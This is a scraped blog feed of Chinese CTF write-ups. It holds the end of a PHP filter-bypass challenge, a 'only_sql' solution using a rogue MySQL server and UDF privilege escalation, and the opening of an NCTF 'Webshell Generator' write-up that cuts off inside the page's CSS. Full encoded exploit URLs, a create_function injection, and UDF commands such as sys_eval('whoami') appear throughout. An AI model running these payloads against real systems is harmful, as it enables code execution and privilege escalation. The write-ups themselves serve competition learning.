<span class="token punctuation">&#125;</span> <span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>okok解释一下吧</p>
<h3 id="1"><a href="#1" class="headerlink" title="1"></a>1</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> 
    <span class="token keyword">if</span> <span class="token punctuation">(</span>
        <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/shana|debu|aqua|cute|arg|code|flag|system|exec|passwd|ass|eval|sort|shell|ob|start|mail|\$|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|read|inc|info|bin|hex|oct|echo|print|pi|\.|\"|\'|log/i'</span><span class="token punctuation">,</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'QUERY_STRING'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
        <span class="token punctuation">)</span>  
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'You seem to want to do something bad?'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>QUERY_STRING就是问号后面的数据<br><img src="https://img-blog.csdnimg.cn/direct/b07e8e63d63146e987217970071e1079.png" alt="456"><br>也就是说问号后面的数据不能出现正则匹配里的字符<br>由于<code>$_SERVER[&#39;QUERY_STRING&#39;]</code>不可以进行urldecode，而<code>$_GET[]</code>可以，因此可以用url全编码绕过正则</p>
<h3 id="2"><a href="#2" class="headerlink" title="2"></a>2</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/http|https/i'</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/^aqua_is_cute$/'</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'debu'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'debu'</span><span class="token punctuation">]</span> <span class="token operator">!==</span> <span class="token string single-quoted-string">'aqua_is_cute'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> 
        <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">;</span> 
        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Neeeeee! Good Job!&lt;br>"</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span> 
<span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'fxck you! What do you want to do ?!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><code>/^aqua_is_cute$/</code>开头结尾都是<strong>aqua_is_cute</strong><br>就是说传入debu的字符不能等于<strong>aqua_is_cute</strong>而且还要满足正则表达式，（使用换行%0a来绕过正则匹配）<br>debu&#x3D;aqua_is_cute%0a</p>
<h3 id="3"><a href="#3" class="headerlink" title="3"></a>3</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> 
    <span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span> <span class="token keyword">as</span> <span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> 
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[a-zA-Z]/i'</span><span class="token punctuation">,</span> <span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  
            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'fxck you! I hate English!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
    <span class="token punctuation">&#125;</span> 
<span class="token punctuation">&#125;</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>涉及到一个小tirck：<br>$_REQUEST在同时接受POST和GET参数时，POST优先级高</p>
<h3 id="4"><a href="#4" class="headerlink" title="4"></a>4</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token string single-quoted-string">'debu_debu_aqua'</span><span class="token punctuation">)</span>
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Aqua is the cutest five-year-old child in the world! Isn't it ?&lt;br>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>也就是file传入的参数等于<strong>debu_debu_aqua</strong>，这里要绕过file_get_contents函数使用data伪协议<code>file=data://text/plain,debu_debu_aqua</code></p>
<h3 id="5"><a href="#5" class="headerlink" title="5"></a>5</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$shana</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$passwd</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$shana</span> <span class="token operator">!=</span> <span class="token variable">$passwd</span> <span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token function">extract</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"flag"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//注意到这里，后面会用到</span>
    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Very good! you know my password. But what is flag?&lt;br>"</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span> <span class="token keyword">else</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"fxck you! you don't know my password! And you don't know sha1! why you come here!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>这个就是使用数组绕过就行<br>shana[]&#x3D;1&amp;passwd[]&#x3D;2</p>
<p>到这里就还剩最后一关，整理一下上面的<br><code>debu=aqua_is_cute%0a</code><br><code>file=data://text/plain,debu_debu_aqua</code><br><code>shana[]=1&amp;passwd[]=2</code><br>针对于<code>$_REQUEST在同时接受POST和GET参数时，POST优先级高</code>，只需再传入一个POST的<code>debu</code>和<code>file</code>值为数字即可。<br><code>1nD3x.php?debu=aqua_is_cute%0a&amp;file=data://text/plain,debu_debu_aqua&amp;shana[]=1&amp;passwd[]=2</code><br>在进行url全编码可得<br><code>1nD3x.php?%64%65%62%75=%61%71%75%61%5f%69%73%5f%63%75%74%65%0a&amp;file=%64%61%74%61%3a%2f%2f%74%65%78%74%2f%70%6c%61%69%6e%2c%64%65%62%75%5f%64%65%62%75%5f%61%71%75%61&amp;%73%68%61%6e%61[]=1&amp;%70%61%73%73%77%64[]=2</code><br>POST<code>file=1&amp;debu=2</code><br><img src="https://img-blog.csdnimg.cn/direct/f0da076569004a95af4254cd1d034c89.png" alt="123"></p>
<h3 id="6"><a href="#6" class="headerlink" title="6"></a>6</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/^[a-z0-9]*$/isD'</span><span class="token punctuation">,</span> <span class="token variable">$code</span><span class="token punctuation">)</span> <span class="token operator">||</span> 
<span class="token class-name">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\`|\&#123;|\%|x|\&amp;|\$|\*|\||\&lt;|\"|\'|\=|\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\.|log|\^/i'</span><span class="token punctuation">,</span> <span class="token variable">$arg</span><span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> 
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"&lt;br />Neeeeee~! I have disabled all dangerous functions! You can't get my flag =w="</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
<span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span> 
    <span class="token keyword">include</span> <span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">;</span>
    <span class="token variable">$code</span><span class="token punctuation">(</span><span class="token string single-quoted-string">''</span><span class="token punctuation">,</span> <span class="token variable">$arg</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>可控的有code和arg，在<code>$code(&#39;&#39;, $arg)</code>可以使用creat_function进行注入<br>上面出现的<code>extract($_GET[&quot;flag&quot;]);</code>在这里发挥了作用</p>
<blockquote>
<p>extract()函数用于从数组中将变量导入到当前的符号表。换句话说，它会创建新的变量，这些变量的名称和值来自于你传递给 extract() 的数组。<br>因此，extract($_GET[“flag”]); 这行代码的意图是从 URL 参数中获取名为 “flag” 的值，并尝试使用这个值作为变量名来创建一个新的变量，同时这个新变量的值也将是 “flag” 参数的值。<br>例如，如果 URL 是 <a href="http://example.com/?flag=testValue%EF%BC%8C%E9%82%A3%E4%B9%88%E6%89%A7%E8%A1%8C%E8%BF%99%E8%A1%8C%E4%BB%A3%E7%A0%81%E5%90%8E%EF%BC%8C%E5%B0%86%E4%BC%9A%E6%9C%89%E4%B8%80%E4%B8%AA%E5%90%8D%E4%B8%BA">http://example.com/?flag=testValue，那么执行这行代码后，将会有一个名为</a> $testValue 的新变量，其值为 “testValue”。</p>
</blockquote>
<p>这就好理解了，现在传入flag[code]，flag[arg]。也就是存在了GET传入的code和arg参数。<br>在基于要配合<code>create_function</code>进行注入：<br><code>flag[code]=create_function</code><br>这时就是<br><code>create_function(&#39;&#39;, $arg);</code><br>尝试传入arg的值让代码进行闭合<br><code>flag[arg]=&#125;代码；//</code><br>这里}就闭合了create_function函数也注释了后面的内容<br>然后构造<code>flag[code]=create_function&amp;flag[arg]=&#125;var_dump(get_defined_vars());//</code><br>var_dump(get_defined_vars())：打印出当前作用域内所有已定义变量的名称、类型和值。<br>再进行全编码后可得<br><code>1nD3x.php?%64%65%62%75=%61%71%75%61%5f%69%73%5f%63%75%74%65%0a&amp;file=%64%61%74%61%3a%2f%2f%74%65%78%74%2f%70%6c%61%69%6e%2c%64%65%62%75%5f%64%65%62%75%5f%61%71%75%61&amp;%73%68%61%6e%61[]=1&amp;%70%61%73%73%77%64[]=2&amp;%66%6c%61%67%5b%63%6f%64%65%5d=%63%72%65%61%74%65%5f%66%75%6e%63%74%69%6f%6e&amp;%66%6c%61%67%5b%61%72%67%5d=&#125;%76%61%72%5f%64%75%6d%70(%67%65%74%5f%64%65%66%69%6e%65%64%5f%76%61%72%73());//</code><br><img src="https://img-blog.csdnimg.cn/direct/f67e05b827b8418b9bb0bb2d20765aed.png" alt="123"><br>使用require读取flag文件<br><code>require(php://filter/read=convert.base64-encode/resource=rea1fl4g.php)</code><br>替换<code>var_dump(get_defined_vars())</code>由于要进行无参传入，这里使用<del>绕过正则<br>&#96;require(</del>(%8f%97%8f%c5%d0%d0%99%96%93%8b%9a%8d%d0%8d%9a%9e%9b%c2%9c%90%91%89%9a%8d%8b%d1%9d%9e%8c%9a%c9%cb%d2%9a%91%9c%90%9b%9a%d0%8d%9a%8c%90%8a%8d%9c%9a%c2%8d%9a%9e%ce%99%93%cb%98%d1%8f%97%8f))<code>最后的payload</code>1nD3x.php?%64%65%62%75&#x3D;%61%71%75%61%5f%69%73%5f%63%75%74%65%0a&amp;file&#x3D;%64%61%74%61%3a%2f%2f%74%65%78%74%2f%70%6c%61%69%6e%2c%64%65%62%75%5f%64%65%62%75%5f%61%71%75%61&amp;%73%68%61%6e%61[]&#x3D;1&amp;%70%61%73%73%77%64[]&#x3D;2&amp;%66%6c%61%67%5b%63%6f%64%65%5d&#x3D;%63%72%65%61%74%65%5f%66%75%6e%63%74%69%6f%6e&amp;%66%6c%61%67%5b%61%72%67%5d&#x3D;}require(~(%8f%97%8f%c5%d0%d0%99%96%93%8b%9a%8d%d0%8d%9a%9e%9b%c2%9c%90%91%89%9a%8d%8b%d1%9d%9e%8c%9a%c9%cb%d2%9a%91%9c%90%9b%9a%d0%8d%9a%8c%90%8a%8d%9c%9a%c2%8d%9a%9e%ce%99%93%cb%98%d1%8f%97%8f));&#x2F;&#x2F;&#96;<br><img src="https://img-blog.csdnimg.cn/direct/3a91063c328541b88119eae0f8a3d8ee.png" alt="465"></p>
]]></content>
      <categories>
        <category>赛事WP</category>
      </categories>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>第七届西湖论剑-web-only_sql</title>
    <url>/2024/01/31/%E7%AC%AC%E4%B8%83%E5%B1%8A%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91-web-only-sql/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><meta name="referrer" content="no-referrer"/>

<h2 id="only-sql"><a href="#only-sql" class="headerlink" title="only_sql"></a>only_sql</h2><p>这个题在NN的company下做了出来😊<br>打开题目是一个连接数据库的界面<br><img src="https://img-blog.csdnimg.cn/direct/7c175920fdaf4a6fa917d92017b06c12.png" alt="123"><br>那么可以先伪造一个数据库，采用的项目是<a href="https://github.com/allyshka/Rogue-MySql-Server">Rogue-Mysql-Server</a>，具体看可以参考文章<a href="https://blog.csdn.net/tomyyyyyy/article/details/119881486">伪造mysql服务端</a><br>将项目中的rogue_mysql_server.py文件修改一下<br><img src="https://img-blog.csdnimg.cn/direct/beba83f897c2484ba782cab1a8cb6820.png" alt="123"><br>放在vps上运行<br><img src="https://img-blog.csdnimg.cn/direct/2a3409ccf8a04985a1c1a4f906625036.png" alt="123"><br>然后执行任意语句后查看生成的日志mysql.log<br><img src="https://img-blog.csdnimg.cn/direct/7af086addf264d6fa64a107d9207ced1.png" alt="123"></p>
<blockquote>
<p>127.0.0.1:3306<br>root<br>1q2w3e4r5t!@#<br>mysql</p>
</blockquote>
<p>连接靶机数据库，后面看看能不能进行数据库提权（UDF提权），查看项目<a href="https://github.com/SEC-GO/Red-vs-Blue/blob/master/linux%E7%8E%AF%E5%A2%83%E4%B8%8B%E7%9A%84MySQL%20UDF%E6%8F%90%E6%9D%83.md">linux环境下的MySQL UDF提权</a><br>按照上面的说明进行udf提权<br><img src="https://img-blog.csdnimg.cn/direct/26d82c9cba154c458e5a6d74ce68c435.png" alt="123"></p>
<p><img src="https://img-blog.csdnimg.cn/direct/d1c067ac9e77401898c0936997323213.png" alt="123"><br>可以进行提权</p>
<h3 id="1、获取plugin路径"><a href="#1、获取plugin路径" class="headerlink" title="1、获取plugin路径"></a>1、获取plugin路径</h3><blockquote>
<p>show variables like “%plugin%”;<br><img src="https://img-blog.csdnimg.cn/direct/e4b8affacfbb4f4facf90e0cf1803859.png" alt="456"></p>
</blockquote>
<h3 id="2、获取服务器版本信息"><a href="#2、获取服务器版本信息" class="headerlink" title="2、获取服务器版本信息"></a>2、获取服务器版本信息</h3><blockquote>
<p>show variables like ‘version_compile_%’;<br><img src="https://img-blog.csdnimg.cn/direct/e1b913e4990e401f85094a60b0b13244.png" alt="123"></p>
</blockquote>
<h3 id="3、从sqlmap获取现成的udf文件"><a href="#3、从sqlmap获取现成的udf文件" class="headerlink" title="3、从sqlmap获取现成的udf文件"></a>3、从sqlmap获取现成的udf文件</h3><p>分别是32位和64位的，我们选择64位的。（metasploit里面也有udf文件）</p>
<h3 id="4、上传udf库文件"><a href="#4、上传udf库文件" class="headerlink" title="4、上传udf库文件"></a>4、上传udf库文件</h3><p>获取库文件的16进制（这里我的linux中没有安装mysql服务，因此我把so文件放在了windows里面来得到的文件的16进制）<br>开启MySQL服务然后获取so文件的16进制</p>
<blockquote>
<p>select hex(load_file(‘C:\Users\86159\Desktop\lib_mysqludf_sys.so’)) into outfile ‘C:\Users\86159\Desktop\udf.txt’;<br>注意路径要进行双斜杠</p>
<p><img src="https://img-blog.csdnimg.cn/direct/d2812023f9944fc2ac38c4d005f72690.png" alt="123"><br>成功得到udf.txt<br>4.1、上传库文件<br>select unhex(‘7F454C46020101……000’) into dumpfile ‘&#x2F;usr&#x2F;lib&#x2F;mysql&#x2F;p1ugin&#x2F;mysqludf.so’;<br><code>7F454C46020101......000</code>是udf.txt文件内容，注意不要换行！！<br>上面这个命令在靶机的mysql交互命令行里执行</p>
</blockquote>
<p>然后依次执行</p>
<blockquote>
<p>create function sys_eval returns string soname “mysqludf.so”;<br>select sys_eval(‘whoami’);（到这里就可以命令执行了）</p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/direct/86d5cfda97a24523bcefd3aff7e92e94.png" alt="123"><br>flag在环境变量里面执行env</p>
<p><img src="https://img-blog.csdnimg.cn/direct/e006ffe2bcae4eabb24a8c75ed0097ef.png" alt="123"></p>
]]></content>
      <categories>
        <category>赛事WP</category>
      </categories>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>NCTF-2023-Webshell-Generator</title>
    <url>/2024/01/31/NCTF-2023-Webshell-Generator/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><meta name="referrer" content="no-referrer"/>

<h2 id="NCTF-2023-Webshell-Generator"><a href="#NCTF-2023-Webshell-Generator" class="headerlink" title="[NCTF 2023]Webshell Generator"></a>[NCTF 2023]Webshell Generator</h2><p>以前的题目了，今天过来复现一下吧。。。<br>这个主要考察sed命令注入，当然这个题目它存在文件读取，难度相对来说也好了一点<br>打开题目页面如下：<br><img src="https://img-blog.csdnimg.cn/direct/135f4f194de849418962770eb0a2ec18.png" alt="123"></p>
<p>经过测试发现密钥我们是可控的，还有一点在使用bp的过程中，下载webshell.php的响应包出现可疑点。</p>
<p><img src="https://img-blog.csdnimg.cn/direct/5cc52620e5fd4099afa1cca8953bfb9b.png" alt="123"></p>
<p>尝试一下能不能读取文件，很确定，当然可以😁<br><img src="https://img-blog.csdnimg.cn/direct/dcd24a6978f44b74ae6a845138129fd7.png" alt="456"><br>将文件index,php、download.php、generate.sh读取出来审计<br>index.php</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">function</span> <span class="token function-definition function">security_validate</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$_POST</span> <span class="token keyword">as</span> <span class="token variable">$key</span> <span class="token operator">=></span> <span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/\r|\n/'</span><span class="token punctuation">,</span> <span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"<span class="token interpolation"><span class="token variable">$key</span></span> 不能包含换行符！"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">114</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"<span class="token interpolation"><span class="token variable">$key</span></span> 不能超过114个字符！"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token function">security_validate</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span>@<span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'method'</span><span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> @<span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'key'</span><span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> @<span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'filename'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'language'</span><span class="token punctuation">]</span> <span class="token operator">!==</span> <span class="token string single-quoted-string">'PHP'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"PHP是最好的语言"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token variable">$method</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'method'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token variable">$key</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'key'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token function">putenv</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"METHOD=<span class="token interpolation"><span class="token variable">$method</span></span>"</span><span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"你的method太复杂了！"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">putenv</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"KEY=<span class="token interpolation"><span class="token variable">$key</span></span>"</span><span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"你的key太复杂了！"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$status_code</span> <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token function">shell_exec</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"sh generate.sh"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$filename</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"生成失败了！"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Location: download.php?file=<span class="token interpolation"><span class="token variable">$filename</span></span>&amp;filename=<span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'filename'</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span></span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token delimiter important">?></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>

<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>Webshell生成器<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>utf-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">></span></span><span class="token style"><span class="token language-css">
        <span class="token selector">body</span> <span class="token punctuation">&#123;</span>
            <span class="token property">background-color</span><span class="token punctuation">:</span> #f2f2f2<span class="token punctuation">;</span>
            <span class="token property">font-family</span><span class="token punctuation">:</span> Arial<span class="token punctuation">,</span> sans-serif<span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>

        <span class="token selector">form</span> <span class="token punctuation">&#123;</span>
            <span class="token property">margin</span><span class="token punctuation">:</span> 50px auto<span class="token punctuation">;</span>
            <span class="token property">width</span><span class="token punctuation">:</span> 400px<span class="token punctuation">;</span>
            <span class="token property">background-color</span><span class="token punctuation">:</span> #fff<span class="token punctuation">;</span>
            <span class="token property">padding</span><span class="token punctuation">:</span> 20px<span class="token punctuation">;</span>
            <span class="token property">border-radius</span><span class="token punctuation">:</span> 10px<span class="token punctuation">;</span>
            <span class="token property">box-shadow</span><span class="token punctuation">:</span> 0px 0px 10px <span class="token function">rgba</span><span class="token punctuation">(</span>0<span class="token punctuation">,</span> 0<span class="token punctuation">,</span> 0<span class="token punctuation">,</span> 0.2<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>

        <span class="token selector">h1</span> <span class="token punctuation">&#123;</span>
            <span class="token property">text-align</span><span class="token punctuation">:</span> center<span class="token punctuation">;</span>
            <span class="token property">color</span><span class="token punctuation">:</span> #333<span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>

        <span class="token selector">label</span> <span class="token punctuation">&#123;</span>
            <span class="token property">display</span><span class="token punctuation">:</span> block<span class="token punctuation">;</span>
            <span class="token property">margin-bottom</span><span class="token punctuation">:</span> 10px<span class="token punctuation">;</span>
            <span class="token property">color</span><span class="token punctuation">:</span> #666<span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>

        <span class="token selector">input[type="text"],
        select</span> <span class="token punctuation">&#123;</span>
            <span class="token property">width</span><span class="token punctuation">:</span> 100%<span class="token punctuation">;</span>
            <span class="token property">padding</span><span class="token punctuation">:</span> 10px<span class="token punctuation">;</span>
            <span class="token property">border-radius</span><span class="token punctuation">:</span> 5px<span class="token punctuation">;</span>
            <span class="token property">border</span><span class="token punctuation">:</span> none<span class="token punctuation">;</span>
            <span class="token property">margin-bottom</span><span class="token punctuation">:</span> 20px<span class="token punctuation">;</span>
            <span class="token property">box-sizing</span><span class="token punctuation">:</span> border-box<span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>

        <span class="token selector">input[type="submit"]</span> <span class="token punctuation">&#123;</span>
            <span class="token property">background-color</span><span class="token punctuation">:</span> #4CAF50<span class="token punctuation">;</span>
            <span class="token property">color</span><span class="token punctuation">:</span> #fff<span class="token punctuation">;</span>
            <span class="token property">border</span><span class="token punctuation">:</span> none<span class="token punctuation">;</span>
            <span class="token property">padding</span><span class="token punctuation">:</span> 10px 20px<span class="token punctuation">;</span>
            <span class="token property">border-radius</span><span class="token punctuation">:</span> 5px<span class="token punctuation">;</span>
            <span class="token property">cursor</span><span class="token punctuation">:</span> pointer<span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>

        <span class="token selector">input[type="submit"]:hover</span> <span class="token punctuation">&#123;</span>
